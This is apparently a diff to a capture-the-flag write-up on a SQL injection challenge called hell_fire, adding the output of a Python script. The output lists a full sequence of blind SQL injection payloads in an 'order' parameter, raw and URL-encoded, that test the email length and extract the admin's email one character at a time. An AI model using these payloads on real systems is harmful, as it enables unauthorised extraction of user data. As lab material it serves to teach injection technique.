@@ -170,7 +170,125 @@ print(f"[!] Extracted email: {password}")
 print(f"[!] Final payload: ?email={password}")
 ```
 
-
 ```
-admin%5Fsecure%5Femail@emai1.com
+$ python .\hell_fire_script.py
+
+[!] Payload: ?order=if(id='admin' and length(email)=28, 1, 2)
+[!] Payload (URL encoded): ?order=if%28id%3D%27admin%27+and+length%28email%29%3D28%2C+1%2C+2%29
+[!] Email length: 28
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 1, 1))='97', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+1%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
+[+] Character at index 1: a
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 2, 1))='100', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+2%2C+1%29%29%3D%27100%27%2C+1%2C+2%29
+[+] Character at index 2: d
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 3, 1))='109', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+3%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
+[+] Character at index 3: m
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 4, 1))='105', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+4%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
+[+] Character at index 4: i
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 5, 1))='110', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+5%2C+1%29%29%3D%27110%27%2C+1%2C+2%29
+[+] Character at index 5: n
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 6, 1))='95', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+6%2C+1%29%29%3D%2795%27%2C+1%2C+2%29
+[+] Character at index 6: _
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 7, 1))='115', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+7%2C+1%29%29%3D%27115%27%2C+1%2C+2%29
+[+] Character at index 7: s
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 8, 1))='101', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+8%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
+[+] Character at index 8: e
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 9, 1))='99', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+9%2C+1%29%29%3D%2799%27%2C+1%2C+2%29
+[+] Character at index 9: c
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 10, 1))='117', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+10%2C+1%29%29%3D%27117%27%2C+1%2C+2%29
+[+] Character at index 10: u
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 11, 1))='114', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+11%2C+1%29%29%3D%27114%27%2C+1%2C+2%29
+[+] Character at index 11: r
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 12, 1))='101', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+12%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
+[+] Character at index 12: e
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 13, 1))='95', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+13%2C+1%29%29%3D%2795%27%2C+1%2C+2%29
+[+] Character at index 13: _
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 14, 1))='101', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+14%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
+[+] Character at index 14: e
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 15, 1))='109', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+15%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
+[+] Character at index 15: m
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 16, 1))='97', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+16%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
+[+] Character at index 16: a
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 17, 1))='105', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+17%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
+[+] Character at index 17: i
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 18, 1))='108', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+18%2C+1%29%29%3D%27108%27%2C+1%2C+2%29
+[+] Character at index 18: l
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 19, 1))='64', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+19%2C+1%29%29%3D%2764%27%2C+1%2C+2%29
+[+] Character at index 19: @
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 20, 1))='101', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+20%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
+[+] Character at index 20: e
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 21, 1))='109', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+21%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
+[+] Character at index 21: m
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 22, 1))='97', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+22%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
+[+] Character at index 22: a
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 23, 1))='105', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+23%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
+[+] Character at index 23: i
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 24, 1))='49', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+24%2C+1%29%29%3D%2749%27%2C+1%2C+2%29
+[+] Character at index 24: 1
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 25, 1))='46', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+25%2C+1%29%29%3D%2746%27%2C+1%2C+2%29
+[+] Character at index 25: .
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 26, 1))='99', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+26%2C+1%29%29%3D%2799%27%2C+1%2C+2%29
+[+] Character at index 26: c
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 27, 1))='111', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+27%2C+1%29%29%3D%27111%27%2C+1%2C+2%29
+[+] Character at index 27: o
+
+[+] Payload: ?order=if(id='admin' AND ord(substr(email, 28, 1))='109', 1, 2)
+[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+28%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
+[+] Character at index 28: m
+
+[!] Extracted email: admin_secure_email@emai1.com
+[!] Final payload: ?email=admin_secure_email@emai1.com
 ```
